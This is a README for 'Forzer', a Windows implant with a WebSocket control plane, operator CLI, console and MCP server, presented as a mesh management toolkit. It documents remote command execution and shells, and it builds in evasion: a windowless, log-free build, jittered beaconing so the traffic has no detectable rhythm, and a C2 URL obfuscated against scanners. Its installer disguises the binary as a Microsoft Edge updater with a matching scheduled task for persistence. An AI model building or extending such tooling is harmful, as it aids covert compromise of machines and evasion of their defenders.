# Forzer

A small peer-to-peer mesh control toolkit with three cooperating parts:

| Component | Path | What it is |
|-----------|------|------------|
| **Agent** | [`agent/`](./agent) | Windows C client (`Forzer.c` + `ngcrypt.c`, built to `Forzer.exe`) that connects to the control plane over WebSocket (ws / wss via Schannel), runs remote commands and interactive shells. **This is the bot** — it executes what the control plane tells it, and nothing else. |
| **Control plane** | [`server/`](./server) | Node.js WebSocket server (`server.js`) that registers peers, relays signalling/commands, and serves a web dashboard. Deployable to Render. |
| **CLI client** | [`client/`](./client) | `forzerctl.js` — operator console for a human at a shell. Sends commands, cannot be commanded. |
| **MCP server** | [`mcp/`](./mcp) | Zero-dependency Model Context Protocol server exposing the control plane (list peers, run commands, open terminals) over stdio JSON-RPC. |

### Which side are you on

| | `agent/` | `client/` |
|---|---|---|
| Runs on | the machine being **managed** | **your** machine |
| Registers as | a *device/peer* in the mesh | a *viewer* on the dashboard |
| Authenticates with | its own 32-byte key (DPAPI-pinned) | dashboard `user`/`pass` |
| Role | **receives** and executes commands | **originates** commands |
| Can it be commanded? | yes — that is its job | no, ever |

Both dial the control plane outbound, so a managed machine never needs an inbound port.

### Identity and the handshake

Every implant holds a 32-byte shared secret, minted once on first run and kept
in `%APPDATA%\Forzer\identity.key` (DPAPI-encrypted, so the file is useless
without the user profile). Check-in is a two-step exchange:

```
implant                                   control plane
   |-- register {name, secret} --------->|   roster cap checked
   |<--------------- challenge {nonce} ----|
   |-- auth {HMAC(secret, "forzer/client/v1" || nonce)} -->|   verified
   |<-- registered {id, serverProof, firstSeen, lastSeen} --|
   |  HMAC(secret, "forzer/server/v1" || nonce) == serverProof
```

Three properties fall out of that, and they are the reason it is worth the extra
round trip:

- **An implant is recognisable across reboots.** `id` is
  `sha256("forzer/implant-id/v1" || secret)[:16]`, so the control plane's registry
  pins it permanently. The previous design minted a fresh random `id` on every
  connection, so a rebooted box rejoined as an unfamiliar device.
- **There is no join secret.** Enrolment is open and the roster is capped
  instead (`FORZER_MAX_IMPLANTS`). There used to be a `SETUP_KEY` every box had
  to present on first contact; it gated almost nothing, cost a great deal, and
  is gone. The reasoning is in [No enrolment secret](#no-enrolment-secret).
- **The control plane is authenticated too.** The server proves possession of the
  same secret under a *different* label — a client proof is not a valid server
  proof, so the exchange cannot be reflected. The secret *is* the pin: there is
  nothing to store and no trust-on-first-use window, because an endpoint that
  cannot produce the server proof is not the one this implant enrolled with.

The secret crosses the wire exactly once, at enrolment, over the pinned TLS
channel. Everything else in the handshake already rests on that channel.

**This was ECDH P-256, and it could not work.** The agent had to reload its
private key on every start, and the host this was developed against will export
an ECC blob from CNG and then refuse to accept it back —
`BCryptImportKey` and `BCryptImportKeyPair` both answer `STATUS_NOT_SUPPORTED`
for private and public blobs alike, across every blob type name and both
documented arities, and the `ncrypt.dll` KSP answers `NTE_NOT_SUPPORTED` for the
same blob. Generation and export work; import never does. So the identity could
never survive a restart.

The asymmetric scheme was not buying much to begin with: the ECDH provided no
forward secrecy (the control plane kept its private key and every implant's
public key permanently, so a later compromise recomputes every past session), and
the server-authentication half was already covered by the certificate pin. What it
did buy is that a leaked registry yielded only public keys; that cost is real and
is now paid differently — see the note on `forzer.db` below, which is a
credential store and should be protected as one.

`bcrypt.dll` is loaded at runtime with every entry point resolved through
`GetProcAddress`, so the agent gains no static import on it — the same approach
already used for ConPTY.

**Check the crypto before you trust it.** The agent cannot be exercised without a
live control plane, so the primitives carry known-answer test vectors generated
independently with OpenSSL:

```powershell
.\agent\build.ps1 -Debug
.\agent\Forzer-debug.exe --selftest
# ngcrypt selftest: OK (HMAC-SHA256 matches OpenSSL; labels separated)
```

Use the debug build: the release build is windowless (`-mwindows`), so its
stdout is not bound to a console and the selftest prints nothing even when it
passes. The exit status is the signal there.

A wrong label, key placement or object size fails here rather than turning into a
handshake that silently never authenticates. This caught a real bug: the HMAC key
was being hashed as part of the message instead of passed at `CreateHash` time,
which produced a valid-looking 32 bytes that were simply the wrong ones.

### The op catalog

Every operation is declared once, in `shared/ops.json`, and both sides read it.
That file is the only place the verb vocabulary is written down — the two
routing sets the server used to keep as hand-edited constants are now derived
from it, and the agent keeps a matching table of what it compiled in.

| op | wire type | capability | what it does |
|---|---|---|---|
| `exec` | `command` | `exec` | run a command line, return output and `rc` |
| `cancel` | `cancel` | `control` | kill the command running on the peer |
| `shell.open` | `term-start` | `shell` | open an interactive pseudo-terminal |
| `shell.input` | `term-input` | `shell` | send keystrokes to an open session |
| `shell.close` | `term-end` | `shell` | close a session |
| `sleep` | `sleep` | `control` | drop the link and stay off the network |
| `update` | `update` | `update` | push a new binary, digest-verified |

Replies (`command-result`, `cancel-result`, `term-data`, `term-exit`, `term-end`) are declared in
the same file, and the loader **refuses to build a catalog** in which a type
appears in both directions unless the op sets `alsoReply` — which only
`shell.close` does, because `term-end` is a viewer's "close this" and the
implant's "closed".

Three things fall out of this that the old code could not express:

- **The agent advertises what it implements** in its `register` frame, and the
  roster carries it. A client greys out an op a given box cannot service
  instead of offering it and eating an error. Capabilities are read from the
  *live* connection, not the stored record: the same id can reconnect running a
  different build.
- **A verb the peer does not implement is not the same failure as a verb that
  does not exist.** `unknown op "exfiltrate"; available: …` versus
  `peer "shell.open" not supported by this implant`. Before the catalog both
  fell through one catch-all and were identical to the operator: nothing at all.
- **A typo from a viewer gets an error instead of a dropped session.** The old
  catch-all closed the socket, so a mistyped verb silently reconnected the
  console with nothing in the log. An implant originating something it may not
  is still closed with `1008` — that is a policy violation, not a typo.

The catalog is validated at load, and `server/test/ops.test.js` runs the real
agent binary (`Forzer.exe --ops-out <file>`) and fails if its table drifts from
the JSON. Nothing else keeps those two files in agreement. `forzerctl ops`
prints the catalog without needing a control plane to be up.

**That test used to skip itself, on every run, silently.** The release build is
`-mwindows`, so it has no bound stdout; the test read stdout, found it empty, and
concluded the build was windowless. A guard that never executes is not coverage,
it is the appearance of coverage, and it had been that way since the catalog
landed. `--ops-out` writes the same JSON to a file, which answers identically in
both subsystem modes, so a binary too old to know the flag now *fails* the
suite with a rebuild message instead of quietly stepping aside.

### Commands are server-authoritative

There is no peer-to-peer command path. Every command travels
**operator → control plane → implant**, which makes the dashboard credential the
trust boundary, and it is the *only* credential in the system.

The server enforces this by splitting the message types in two — both sets
derived from the catalog described above:

| Originator | May send | May **not** send |
|---|---|---|
| dashboard viewer / MCP client / `forzerctl` / console | the ops above | `term-data`, `term-exit` — so an operator can drive a terminal but never fabricate shell output |
| implant (agent) | `command-result`, `term-data`, `term-exit`, `term-end` — replies only | `command`, `term-start`, `term-input`, `signal` |

An implant that sends anything in the right-hand column gets its socket closed
with `1008` and a line in the server log, rather than being silently ignored —
silence is what made the old path invisible.

An implant reply can only reach the operator session bound to that request id
**on that same implant**, so one box still cannot inject terminal output into
another box's session, nor terminate it. That binding is namespaced by the
viewer that owns it — `viewer:f6bf5ad8ea0ea13b:c1`, not `c1` — and the split is
load-bearing rather than tidy. Every `forzerctl` process numbers its own
requests from `c1`, so two operators collide on their first request without
arranging to. Keyed on the bare id, the second binding replaced the first and
the reply went to whichever session bound last: one operator reading another
operator's command output, and a `cancel` reply being consumed by the `run`
that was waiting on the very command being cancelled.

The agent checks the other half independently, and now does it **once** rather
than per branch: the server stamps operator traffic as `from: "viewer:<id>"`,
and every op reachable on the agent passes a single table-driven gate that
requires that stamp and the op's declared capability. Authorization is a
property of the operation, not something each handler has to remember — the
previous chain repeated the origin check in five branches and the remote-exec
check in three, every one an opportunity to forget. `g_allow_remote` still gates
everything that runs code, but not `sleep` or `update`: one is how a box goes
quiet, the other is how you fix it.

`signal` (NAT-traversal candidate exchange) was part of the old mesh and is now
refused in both directions. `apply_peer()` and the peer cache it fed have been
deleted. There is no overlay: implants have no addresses and cannot address each
other, so this is a star around one control plane, not a mesh. Re-enabling a
mesh would be a deliberate future change, not a configuration flag.

### A command that will not stop

`exec` runs one command at a time, in a single slot: while one is running the
next is refused as busy. That is a deliberate limit, and it has a failure mode
— a command that never returns would hold the slot for the life of the install,
refuse every later command, and produce no result at all. `signal` is refused
in both directions, so there was previously no way to stop one.

Two things bound it now.

| | |
|---|---|
| **Deadline** | `FORZER_EXEC_TIMEOUT_MS` (default 5 min, `0` = no limit). The command is terminated and reported as `rc=124`, with `...[timed out after N s; process terminated]` in the output. |
| **`cancel`** | `forzerctl cancel <peer>`, `cancel_command` (MCP), `x` in the console. Kills whatever is running and replies `rc=0`; `rc=1` means the peer was idle, which is reported rather than swallowed. The killed command still answers on its own request id, with `rc=124`. |

The read loop is a `PeekNamedPipe` poll rather than `ReadFile`-to-EOF. That is
what gives it anywhere to notice either of those, and it is also why the drain
is ordered the way it is: the pipe buffer is 4 KB, so a child writing real
output blocks until someone reads, and a loop that stopped reading to check a
deadline would deadlock the command it was trying to rescue.

Two limits worth stating rather than discovering. `TerminateProcess` kills the
process it is handed, so a `cmd.exe`'s own children — anything `start`ed —
survive; fixing that properly needs a job object, which also changes what a
crash cleans up, so it is not smuggled in here. And the post-kill drain is
bounded to 250 ms for the same reason: a surviving grandchild holds the write
end of the pipe open, and an unbounded read waits for *it* instead of for the
operator. Measured on a 25-second `ping` against a 3-second deadline: reply in
3.5 s, not 24 s.

## Dependencies

Almost nothing. The point of the table below is how little is on it.

| Package | Dependencies | Why |
|---|---|---|
| `server/` | `ws` | The only one. Node has no built-in WebSocket **server**, and the control plane needs the server half. |
| `client/` | **none** | Node 22+ ships a WHATWG WebSocket *client* as a global, which is all a CLI needs. |
| `mcp/` | **none** | Same. |
| `agent/` | **none** (no npm, no `bcrypt.lib`) | Windows CNG is loaded at runtime via `GetProcAddress`, so the agent gains no static import. |

`client/` and `mcp/` therefore need **Node >= 22** and nothing installed:

```bash
node client/forzerctl.js peers      # no npm install step
node mcp/mcp-server.js              # no npm install step
```

## Layout

```
Forzer/
├── shared/       # ops.json — the op catalog, read by both sides
├── agent/         # Windows C agent (Forzer.c, ngcrypt.c/.h) + built binary
├── server/        # Node.js server.js, identity.js, ops.js, store.js, public/, test/
├── client/        # forzerctl.js (CLI) + console.js (full-screen TUI) + package.json
├── mcp/           # mcp-server.js + package.json
├── .gitignore
├── LICENSE
└── README.md
```

## Quick start

### Control plane
```bash
cd server
npm install
npm start            # listens on PORT (default 3000)
npm test             # 47 protocol tests + an end-to-end CLI run (own server + temp DB)
# dashboard: http://localhost:3000/dashboard
```

State lives in `server/data/forzer.db` (`node:sqlite`, no dependency) holding the
implant registry — one shared secret per device. `FORZER_DB` overrides the path.
**Treat that file as a credential store**: anyone who reads it can impersonate
every enrolled implant to this control plane. It is the direct cost of the
asymmetric-to-PSK move described above.

> **Render's free tier has an ephemeral filesystem.** `server/data/forzer.db` is
> wiped on every redeploy or sleep-wake, which forgets every enrolled implant and
> makes each one re-enrol as a new device on its next check-in. Attach a disk on
> a paid plan, or point `FORZER_DB` at a real volume, before treating this as more
> than a dev feature. `render.yaml` says the same thing at the point of use.

### Agent (Windows, MinGW / MSVC cl)
```bash
cd agent
FORZER_SERVER=ws://127.0.0.1:3000 Forzer.exe
```

Build **quiet, windowless** (what you want for a persistent install):
```powershell
# MSVC — GUI subsystem with a main() entry point
cl.exe /O2 /GS- Forzer.c ngcrypt.c ws2_32.lib advapi32.lib crypt32.lib secur32.lib /Fe:Forzer.exe /link /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup

# MinGW-w64
x86_64-w64-mingw32-gcc -O2 -o Forzer.exe Forzer.c ngcrypt.c -lws2_32 -ladvapi32 -lcrypt32 -lsecur32  -mwindows -Wl,--entry,mainCRTStartup
```
`ngcrypt.c` is the CNG wrapper. It is **not** linked against `bcrypt.lib` — every
CNG call goes through a function pointer resolved at runtime — so it contributes
no import-table entry. Add `-Wno-cast-align` under MinGW if you touch the blob
marshalling.
`/SUBSYSTEM:WINDOWS` is what stops a console window appearing when the Run key
starts the agent. `/ENTRY:mainCRTStartup` is required because the app defines
`main()`, not `WinMain()`.

Build with reporting on (console-subsystem, `-DFORZER_DEBUG=1`):
```bash
cl.exe /O2 /GS- -DFORZER_DEBUG=1 Forzer.c ngcrypt.c ws2_32.lib advapi32.lib crypt32.lib secur32.lib /Fe:Forzer-debug.exe
```

### Quiet operation

The agent is silent by default: it writes no console output, no log file, and
nothing to the Windows event log. All of the per-event reporting — peer
registrations, command completions, TLS checks, reconnect backoff, results —
is behind `DBG()` and compiled out unless `FORZER_DEBUG` is defined. Build
`-DFORZER_DEBUG=1` when you need to see why a bot will not connect.

There is a second, quieter sense of the word, and it is the more interesting
one: how much the install shows up in the network, on the host, and in a log.
That is what the rest of this section is about.

| Was | Now | Why |
|-----|-----|-----|
| Poll loop woke every 50 ms forever | 50 ms while a terminal or command is live, 5 s otherwise | An idle box was waking twenty times a second to do nothing, for the life of the install. The server's 30 s ping is what keeps the link honest, so idling on it costs nothing. |
| Reconnect backoff was exactly 2, 4, 8, 16, 32, 60 s | Same ladder, ±50% jitter, from the CNG CSPRNG | A fixed ladder is a fingerprint: it reproduces identically after every reboot, every network reset and every server restart. That regularity *is* what a beacon is. |
| First check-in at the instant the process started | Random 0–45 s delay (`FORZER_STARTUP_JITTER_MS`) | A fleet that logs in together completes its handshake in the same second. Spreading first contact over a window costs nothing and removes the synchronised shape. |
| Every enrol, reconnect and disconnect pushed the whole roster to every implant | Viewers only | The agent parses none of it — its own handler says so. One host rebooting used to wake every box on the mesh to receive a document none of them read, and the cost grew with the fleet. |
| An agent with nothing to do held a socket open indefinitely | `sleep <peer> [secs]` — CLI, `sleep_peer` MCP tool, dashboard button | A standing connection is a standing heartbeat and a connection-log entry on both sides, forever. `sleep` closes the link, waits the interval out (plus up to 20% jitter) and handshakes again on the same pinned key, so the box comes back as the same implant. The server caps it at one hour. |
| Abrupt disconnect | Clean WebSocket close frame (1000) | A deliberate disconnect should not look like a half-finished connection to anything reading connection logs. |
| Terminal respawn was unconditional | Capped at 3 per session, then the session ends | A shell that exited on its own — an operator typing `exit` — was respawned every few hundred milliseconds for as long as the viewer stayed connected. |
| Runtime diagnostics used bare `fprintf(stderr, …)` | `INFO()`, which prints only when a console is attached (always under `FORZER_DEBUG`) | A headless Run-key launch has no console, so a box that failed to authenticate on every reconnect produced a stream of formatted writes into nothing. |
| Failed connection attempts leaked a socket and a Schannel context | All failure paths go through one `session_teardown()` | A failed attempt ends in a reconnect, not in process exit, so those handles accumulated for the life of the install. |
| A `Sec-WebSocket-Accept` mismatch was a warning and carried on | Fatal | A wrong accept means the endpoint did not read the handshake, so it is not the WebSocket server it claims to be. |
| One DNS blip or refused connection ended the process | Transient failures return "retry" and go through the jittered backoff; only a bad URL or missing entropy exits | Under a Run key there is no console to complain on and nobody to relaunch, so a single network moment left the box dark until the next logon. This one was also the loudest kind of silence: the agent was simply gone. A profile that has not finished unlocking at logon, so DPAPI cannot open the identity yet, hits the same path. |

Two behaviours are conditional on there being a person watching:
`attach_parent_console()` reattaches the parent console so an interactive launch
still gets a usable `list` prompt, and the local prompt thread returns
immediately if stdin is not a console, so a Run-key launch does not announce a
prompt nobody can type at. `list` now reports this agent's own identity rather
than a peer cache. `run` was removed: the control plane refuses
implant-originated traffic, so a command typed there would have nowhere to go. The one exception to silence is the placeholder-setup-key warning, which
is printed only on an interactive launch.

`--selftest` is unaffected by any of this: it prints its result whether or not
a console is attached, because that is the whole point of it.

Do not add a log file without thinking about it: a log of received commands is
also a record of what the box was told to do.

### CLI client
No `npm install` — `forzerctl` has zero dependencies.
```bash
cd client && npm link            # optional: puts `forzerctl` on PATH

forzerctl --url ws://127.0.0.1:3000 peers
forzerctl run simhost whoami              # implant id *or* name
forzerctl term simhost                    # Ctrl-] detaches, Ctrl-C interrupts
forzerctl cancel simhost                  # stop whatever it is running
forzerctl sleep simhost 3600              # disconnect for an hour, then check back
forzerctl ops                             # the op catalog; needs no server
forzerctl                                # no args: interactive prompt
```
Accepts a name as well as an id, but ids are now key-derived and stable, so
prefer the id where you can.

### Operator console

`forzerctl` is for a script. For sitting in front of a fleet, `client/console.js`:

```bash
node client/console.js
```

```
  #   PEER            ID                STATE   PROTO   OPS
▸ 1  DESKTOP-ABC     51498c3e22cfab26  online  v2      exec shell.open shell.inp…
  2  LAPTOP-XYZ      7a1b2c3d4e5f6071  offline 2      exec sleep

  e exec   s shell   u update   x cancel   z sleep   [1-9] select   r refresh   q quit
```

The roster is **pushed** by the server on every enrol and reconnect — there is
no polling, and the once-a-second redraw only ages the "last seen" column.
Operations a peer does not advertise are dimmed, so the console never offers
something that would come back as an error. `e` runs a command and shows the
output in a pane rather than one clipped line; `s` opens a pseudo-terminal and
passes raw keystrokes through, including Ctrl-C, which is a real interrupt on
the far side. Ctrl-] detaches.

It reconnects on its own when the control plane goes away, since a redeploy is
not an error state. It needs a real terminal — with no TTY it points you at
`forzerctl` rather than pretending to be interactive.

### Agent update
Updates are pushed over the control plane the agent is already connected to.
There is no download URL in the agent: it used to fetch a build from a
hardcoded GitHub raw URL, which put that URL in the binary's `.rdata` and put
a request to a well-known third-party domain on the wire on every check. The
server now reads the file, announces its SHA-256, and sends the bytes as a
binary frame; the agent refuses anything that does not hash to the announced
digest, stages it, swaps itself and relaunches.
```bash
forzerctl update <peer> /path/to/Forzer.exe          # apply at next start (default)
forzerctl update <peer> /path/to/Forzer.exe --now    # relaunch this process now
```
Omit the path to push the server's own build. The digest travels over the
already-authenticated channel, so an unpinned update is no longer possible.

**Two apply modes, chosen by the control plane.** The `update` frame carries a
`restart` field: `1` installs and immediately relaunches the process (a
self-spawn, so the new code is live at once); `0` (the default) installs the
new image on disk and leaves the running process alone, so nothing spawns and
the new code takes effect the next time the agent starts — the logon task, or
any later relaunch. Queued is the quieter default and still fully verified;
`--now` is there when you want the change live without waiting for a logon.
Repeated queued pushes in the same process are handled: once the running image
has been moved aside to `.bak`, later pushes overwrite the on-disk path
directly rather than re-renaming the locked `.bak`.

### MCP server
No `npm install` either.
```bash
FORZER_MCP_URL=ws://127.0.0.1:3000 FORZER_MCP_USER=Forgot FORZER_MCP_PASS='HelloWorld1!' node mcp/mcp-server.js
```
`FORZER_MCP_URL` falls back to `FORZER_SERVER`, and the credentials fall back to `DASH_USER` / `DASH_PASS`.

## Testing

```bash
cd server
npm test
```

- `test/handshake.test.js` — 29 tests over the identity handshake, the
  origination policy and the quiet path (roster routing, `sleep` relay and
  its caps). Spins up its own server and a temp DB, with the auth threshold
  raised: it fails authentication deliberately, and every socket in the file
  arrives from 127.0.0.1, so the default limit would turn one more bad-proof
  test into a lockout that fails everything after it. The throttle has its own
  file for the same reason.
- `test/ops.test.js` — 12 tests over the catalog: the loader's validation, the
  difference between *unknown verb* and *this peer cannot do that*, and the
  drift check against the real agent binary.
- `test/throttle.test.js` — 5 tests over the brute-force throttle, each against
  its **own** server process with deliberately tiny limits. One server would
  mean one test's lockout silently becoming every other test's.
- `test/e2e-cli.test.js` — starts a real control plane, enrols a simulated
  implant, then runs `forzerctl.js` as a **subprocess from a scratch directory
  with no `node_modules`**. If anything in the CLI's require chain ever pulled
  `ws` back in, it fails with `MODULE_NOT_FOUND` instead of quietly resolving
  from a parent's tree. Covers the empty roster, bad credentials, a full command
  round trip, a full **cancel** round trip (a command that never returns, killed
  mid-flight, with the `run` still blocked on the reply when it lands), a full
  sleep cycle (the implant drops the link and comes back on the same id), and
  the unknown-implant exit path.
- `test/_fake-implant.js` — the simulated implant. It speaks the real handshake
  over the *built-in* WebSocket, so the e2e test is not accidentally testing
  `ws` against itself.

The agent is the one component these cannot cover, since it needs a Windows
build. It carries its own check instead:

```powershell
.\agent\build.ps1 -Debug
.\agent\Forzer-debug.exe --selftest
# ngcrypt selftest: OK (HMAC-SHA256 matches OpenSSL; labels separated)
```

Use the debug build: the release build is windowless (`-mwindows`), so its
stdout is not bound to a console and the selftest prints nothing even when it
passes. The exit status is the signal there.

## Environment

| Variable | Component | Meaning |
|----------|-----------|---------|
| `PORT` | server | listen port (default `3000`) |
| `DASH_USER` / `DASH_PASS` | server | dashboard login |
| `DASH_ALLOWED_ORIGINS` | server | comma-separated extra `Origin` values to accept for the dashboard WebSocket (same-origin is always allowed; the C agent sends no `Origin` and is unaffected) |
| `FORZER_AUTH_MAX_FAILURES` | server | failed auths from one address inside the window before it is locked out (default 8) |
| `FORZER_AUTH_WINDOW_MS` | server | the window those failures are counted in (default 600000) |
| `FORZER_AUTH_BLOCK_MS` | server | how long a locked-out address stays locked out (default 900000) |
| `FORZER_AUTH_DEADLINE_MS` | server | how long a socket may stay connected without authenticating before it is closed (default 30000) |
| `FORZER_MAX_UNAUTH_PER_IP` | server | concurrent *unauthenticated* sockets allowed from one address (default 16) |
| `FORZER_MAX_IMPLANTS` | server | ceiling on the roster, since enrolment itself is open (default 256) |
| `FORZER_SERVER` | agent | `ws://` or `wss://` control-plane URL (overrides the config file) |
| `FORZER_NAME` | agent | device name to register as (defaults to the computer name) |
| `FORZER_ALLOW_REMOTE` | agent | set to `0` to refuse remote commands and terminal sessions |
| `FORZER_EXEC_TIMEOUT_MS` | agent | ms before a running command is killed and reported as `rc=124` (0–86400000, default 300000; 0 = no limit) |
| `FORZER_STARTUP_JITTER_MS` | agent | window for the random delay before the first check-in (0–600000, default 45000) |
| `forzerctl update <peer> [path] [--now]` | client | push a new agent binary over the control plane (--now = relaunch now, default = apply at next start) |
| `FORZER_URL` / `FORZER_USER` / `FORZER_PASS` | client | control plane and dashboard credentials (also `DASH_*` / `FORZER_MCP_*`) |
| `FORZER_MCP_URL` / `FORZER_MCP_USER` / `FORZER_MCP_PASS` | mcp | control plane to drive |

## Guessing at the control plane

Both secrets on the wire are guessable and one of them — the dashboard
password — is the trust boundary for every command the control plane relays.
They were previously retryable without limit: one socket per guess, a close
code per failure, and nothing else. "Long enough" was a property of whoever
picked the secret rather than of the server.

| | Default | What it stops |
|---|---|---|
| `FORZER_AUTH_MAX_FAILURES` | 8 | wrong `DASH_PASS` from one address in the window |
| `FORZER_AUTH_WINDOW_MS` | 10 min | …counted within this sliding window |
| `FORZER_AUTH_BLOCK_MS` | 15 min | the address is then refused *before* any credential is compared |
| `FORZER_AUTH_DEADLINE_MS` | 30 s | a socket that connects and never authenticates |
| `FORZER_MAX_UNAUTH_PER_IP` | 16 | concurrent sockets mid-handshake from one address |

Three decisions are worth stating, because the obvious alternative is wrong in
each case.

**One counter covers both secrets.** "Is something guessing at this control
plane" should not depend on which of the two the guesser picked.

**The block is on the address, not on the guesses.** After the threshold, the
*correct* password does not work either. Anything else would make the counter
advisory. A success clears the record, so an operator who fat-fingers twice is
not locked out of their own dashboard by the third try.

**The socket cap counts unauthenticated sockets only.** A cap on connections
would lock out a fleet behind a single NAT address, which is a real deployment
and not an attack; authenticating hands the allowance straight back, so the cap
is a ceiling on handshakes in flight rather than a ratchet.

`X-Forwarded-For` is trusted for the address, because this is meant to run
behind a proxy (Render, a tunnel) where every socket otherwise arrives from one
hop. That is a tradeoff, not a free win: a caller who can reach the port
directly can also lie about its address and buy a fresh budget per frame. The
socket cap is the half that does not depend on the address being true. The
successful-login reset is the other half — it bounds how much a single address
can cost regardless of what it claims.

## No enrolment secret

There used to be a `SETUP_KEY`: every implant had to present it on its first
`register`, on the theory that it gated who could join the fleet. It gated
almost nothing and cost a great deal, so it is gone. What it actually bought:

- **Not command authority.** A holder could add a row to the roster and nothing
  else. The dashboard password was, and still is, the trust boundary.
- **Not impersonation either — that was already covered.** `forzerctl` refuses
  an ambiguous name match (`"DELL24-SEC-036" matches 2 implants — use the id
  instead`), so a squatter registering your box's hostname makes your typed
  command *fail* rather than reach them. The attack denies a convenience; it
  does not become your box.
- **It made every implant a place the control plane's credential lived.** The
  key sat in `%APPDATA%\Forzer\config.json` on every install, so compromising
  any one implant compromised the join capability of the whole fleet. Removing it
  means an implant holds no server credential at all — only its own key, which
  identifies nothing but itself.
- **And it was the secret nobody could find.** An operator who cannot retrieve
  the join key cannot enrol their own box, which is precisely the failure a join
  secret exists to prevent. That happened, on this project, before the argument
  was finished.

What replaces it is a cap. Enrolment is open, so `FORZER_MAX_IMPLANTS` (default
256) bounds an unauthenticated write — it stops a spray from growing the table
without limit and makes a flood visible in the logs as a refusal. A box already
on the roster is exempt, because refusing a reconnect over the state of the
registry would punish an ordinary link drop for someone else's action.

The dashboard password is now the only credential in the system. One thing to
set, one thing to rotate, and nothing to distribute.

## Pinned public key

The agent could not validate a real HTTPS server at all. `CertGetCertificateChain()`
builds a chain from the trusted store plus whatever the caller passes in
`pAdditionalStore`, and by default ignores the intermediates that arrived in the
TLS handshake — and a real server's leaf is issued by an *intermediate*, not a
root. So the chain came back with one element and every `wss://` connection died
with `CERT_E_UNTRUSTEDROOT`. It never showed up because every test target was
`ws://` on loopback; the first real `wss://` target was a public host behind a
CDN, and the agent simply could not reach it.

The certificate was never the problem. Fetching the same URL with the same root
store returned 200, and a deliberate chain build with the system store and an
empty extra store reproduced it exactly: `PartialChain`, `elements=1`.

So the agent now trusts the endpoint two independent ways and accepts either:

| | |
|---|---|
| **Pin** | the leaf's public key is one this build was built with. A commitment to a specific key that a CA mis-issuance cannot produce and a man-in-the-middle cannot forge. |
| **Chain** | the original `CertGetCertificateChain()` + `CERT_CHAIN_POLICY_SSL` check, kept intact — still the right check for any endpoint whose issuer is a root, and every `ws://` development target. |

The hostname is checked in both paths, before either can forgive anything, and
by walking *every* `dNSName` in the subjectAltName rather than the first. That
detail is not academic: the live endpoint presents `DNS:onrender.com,
DNS:*.onrender.com`, so a single-name comparison misses `forzerc2.onrender.com`
while the wildcard two entries later is the name that covers it. The subject CN
is consulted only when there is no SAN at all — that fallback is the whole
family of name-confusion bugs.

For an implant that talks to exactly one endpoint, pinning is the better trust
model, not a workaround: the anchor is "this control plane's key" instead of
"anything a public CA has issued", and the implant stops depending on the host's
root store.

**The pin is a build-time pin.** Regenerate the table with `urlenc.exe`, which
takes one or more hashes and accepts any match, so a rotation can roll out
alongside the old key instead of bricking installs:

```
urlenc.exe wss://your.host <sha256-of-key> [<sha256-of-key> ...]
```

When the server's key rotates, a long-lived install needs a new build. The
natural fix is to carry the pin table in the `update` op, which already moves a
digest over the authenticated channel; that is not implemented, and until it is,
rotation means a rebuild.

## Security note

This is an early-stage research/MVP build. The default dashboard credentials
are placeholders — **override them via environment variables before exposing
anything to a network.** The server logs a warning at startup whenever the
placeholders are still in effect. That password is now the only credential in
the system: there is no second secret to manage, and an implant holds none. Implant state is persisted (see
[Persistence](#persistence--what-exists)); the dashboard viewer sessions and the
live socket table are in memory, which is correct — a browser session is not
something to restore across a redeploy.

The agent validates the server certificate chain and hostname on every `wss://` connection, and
refuses to self-update without a pinned SHA-256. It does **not** pin a Schannel root store, so it
trusts whatever roots the host has installed. It also carries a **pinned public key**
for the built-in endpoint, so an unbuildable chain does not stop it — see
[Pinned public key](#pinned-public-key). The dashboard password is the actual trust
boundary, and it is guessable at the wire, so the control plane rate-limits it:

---

## Persistence — what exists

### Agent: config file and HKCU Run key (implemented)

The agent reads its settings from `%APPDATA%\Forzer\config.json`, falling back to the
directory holding the binary when there is no user profile:

```json
{
  "url": "ws://127.0.0.1:3000",
  "name": "WIN-DESKTOP-01"
}
```

**There is no key in it.** An implant holds no server credential at all — only
its own identity, which proves it is itself and means nothing to anyone else.

Precedence is **environment > config file > built-in default**, so a single launch can still
be overridden by hand. `--config` prints the resolved settings and exits non-zero if no
endpoint could be resolved — useful for answering "why is this talking to the wrong server".

**The built-in default endpoint is obfuscated in the binary.** It used to sit in the clear as
`#define DEFAULT_SERVER "wss://forzerc2.onrender.com"`, which is one `strings` away and a
hardcoded indicator for every static scanner. It is now a keystream-obfuscated byte array
(`k_builtin_url_blob`, decoded at runtime) so `strings Forzer.exe | grep wss` finds nothing,
while a default install still works with zero configuration. This is obfuscation, not
cryptography: a determined reverse engineer can still recover the URL from the binary, which is
true of any hardcoded endpoint. To embed a different endpoint, run the dev tool:

```bash
gcc -O2 -o urlenc.exe urlenc.c        # same keystream as the runtime decoder (urlkey.h)
urlenc.exe wss://your.host            # prints the obfuscated array to paste into Forzer.c
urlenc.exe wss://your.host -d         # self-test: encode/decode round trip
```

or pass the bytes at compile time with `-DFORZER_URL_BLOB=0x..,0x..` (urlenc prints the same
bytes). A default `--install` deliberately does **not** write the built-in URL back into
`config.json` (it writes `"url": ""`), so the endpoint never lands on disk in plaintext; a URL
that genuinely differs — set via `FORZER_SERVER` — is still persisted.

```bash
Forzer.exe --write-config   # write the file from the current environment
Forzer.exe --install        # copy to the install path + add the logon task
Forzer.exe --uninstall      # remove the logon task; the config and binary are kept
Forzer.exe --config         # show resolved settings
```

`--install` copies the executable to
`%LOCALAPPDATA%\Microsoft\EdgeUpdate\MicrosoftEdgeUpdateHelper.exe` and registers a
logon-triggered scheduled task `MicrosoftEdgeUpdateTask` for the current user, so the agent
starts at logon. No administrator rights needed. The install path and task name can be
overridden wholesale with the `FORZER_INSTALL_PATH` environment variable.

The EdgeUpdate folder is where Edge keeps its own updater on essentially every modern
Windows box, and the binary name is a plausible sibling of the real `MicrosoftEdgeUpdate.exe`
(it is deliberately *not* `WindowsDefenderUpdate.exe`, a string many commodity infostealers
use, and not the real Edge binary name, which would collide). The point is that an unfamiliar
updater binary next to the genuine one is among the least surprising things in a per-user
tree.

`--uninstall` removes only the task. It intentionally leaves the binary and config in place,
so a mistaken uninstall is reversible and stop-the-persistence is one reversible step.

It **refuses to install when no endpoint can be resolved**, because a task-launched process
inherits no environment and would otherwise come up silently attached to the public default
server with no operator in the loop.

`config.json` is not a secret — it holds a URL and a name. The only private material in the
process is `identity.key`, DPAPI-sealed to the user and therefore useless anywhere but this
host and this profile. The config is written to a temp file and renamed, so an interrupted
write cannot leave a truncated file behind.

Mechanisms that were considered and not implemented, if you need them: a real Windows service
